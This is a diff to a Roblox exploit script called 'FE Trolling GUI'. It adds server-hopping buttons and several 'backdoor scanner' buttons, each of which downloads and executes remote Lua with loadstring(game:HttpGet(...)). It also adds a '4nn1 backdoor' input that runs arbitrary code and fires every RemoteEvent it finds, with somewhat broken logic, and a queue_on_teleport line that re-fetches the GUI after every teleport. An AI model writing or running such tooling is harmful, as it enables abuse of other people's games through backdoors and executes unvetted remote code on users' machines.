@@ -3,9 +3,9 @@ FE Trolling GUI
 
 By Sky/dsgdfs
 
-Last Updated 3/23/2024
+Last Updated 3/24/2024
 
-added harked guis and comet fe bring player and fe part mover
+added harked guis and comet, qcmds fe bring player and fe part mover added low ping server joiners, queueonteleport and like 5 more backdoor scanners
 
 If you want me to add anything let me know in the discord or dm me
 
@@ -29124,6 +29124,86 @@ Main:AddButton({
 	end
 })
 Main:AddButton({
+	Title = "Join lowest ping server",
+	Description = "method 1",
+	Callback = function()
+		local Lowest = "ping" -- set to "playing" to find the lowest player server
+
+local HTTPService = game:GetService("HttpService")
+
+local success, servers = pcall(function()
+   return HTTPService:JSONDecode(game:HttpGet(
+       "https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100"
+   )).data
+end)
+
+if not success then return end
+
+local server = servers[1]
+
+for i,svr in pairs(servers) do
+   if svr[Lowest] < server[Lowest] then
+       server = svr
+   end
+end
+
+game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, server.id)
+
+	end
+})
+Main:AddButton({
+	Title = "join lowest ping server",
+	Description = "method 2",
+	Callback = function()
+		local HTTPService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local StatsService = game:GetService("Stats")
+
+local function fetchServersData(placeId, limit)
+    local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?limit=%d", placeId, limit)
+    local success, response = pcall(function()
+        return HTTPService:JSONDecode(game:HttpGet(url))
+    end)
+
+    if success and response and response.data then
+        return response.data
+    end
+
+    return nil
+end
+
+local placeId = game.PlaceId
+local serverLimit = 100
+local servers = fetchServersData(placeId, serverLimit)
+
+if not servers then
+    return
+end
+
+local lowestPingServer = servers[1]
+
+for _, server in pairs(servers) do
+    if server["ping"] < lowestPingServer["ping"] and server.maxPlayers > server.playing then
+        lowestPingServer = server
+    end
+end
+
+local commonLoadTime = 5
+task.wait(commonLoadTime)
+
+local pingThreshold = 100
+local serverStats = StatsService.Network.ServerStatsItem
+local dataPing = serverStats["Data Ping"]:GetValueString()
+local pingValue = tonumber(dataPing:match("(%d+)"))
+
+if pingValue >= pingThreshold then
+    TeleportService:TeleportToPlaceInstance(placeId, lowestPingServer.id)
+else
+       -- Good ping
+end
+	end
+})
+Main:AddButton({
 	Title = "Eclipse hub/Sniper to join",
 	Description = "Join Person",
 	Callback = function()
@@ -29386,8 +29466,68 @@ Main:AddButton({
 	Title = "fork of backdoor.exe?",
 	Description = "Scans for backdoors",
 	Callback = function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/FE/BackDoor/fork.txt"))()
 	end
+})
+Main:AddButton({
+	Title = "Frakture SS",
+	Description = "Scans for backdoors",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/FE/BackDoor/Frakture%20SS.txt"))()
+	end
+})
+Main:AddButton({
+	Title = "jalon's backdeer skenner",
+	Description = "Scans for backdoors",
+	Callback = function()
+		--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/backdoor-executor.lua"))()
+	end
+})
+Main:AddButton({
+	Title = "k4scripts",
+	Description = "Scans for backdoors",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/FE/BackDoor/forker.txt"))()
+	end
+})
+Main:AddButton({
+	Title = "og backdoor.exe?",
+	Description = "Scans for backdoors",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/FE/BackDoor/og.txt"))()
+	end
+})
+Main:AddButton({
+	Title = "TntmasterSS",
+	Description = "Scans for backdoors",
+	Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/FE/BackDoor/tntmasterss.txt"))()
+	end
+})
+local Textbox = Main:AddInput("TextboxIdentifier", {
+    Title = "4nn1 backdoor",
+    Default = "Default Value",
+    PlaceHolder = 'require(2648071219).load("userhere")',
+    Numeric = false, -- Only allows numbers
+    Finished = true, -- Only calls the callback when you've pressed enter
+    Callback = function(Value) -- Value ?: string
+        --[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+function scripta()
+    loadstring(Value)
+    print("Success")
+end
+for i, v in pairs(game.ReplicatedStorage:GetDescendants()) do
+    if v:IsA("RemoteEvent") then
+        v:FireServer(scripta())
+print(v.Name)
+    end
+end
+    end
 })
 Main:AddButton({
 	Title = "Blackhole",
@@ -29905,3 +30045,5 @@ local Config = Window:AddTab({
 SaveManager:BuildConfigSection(Config)
 SaveManager:LoadAutoloadConfig()
 Window:SelectTab(1)
+queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/FE%20Trolling%20GUI.luau'))()")
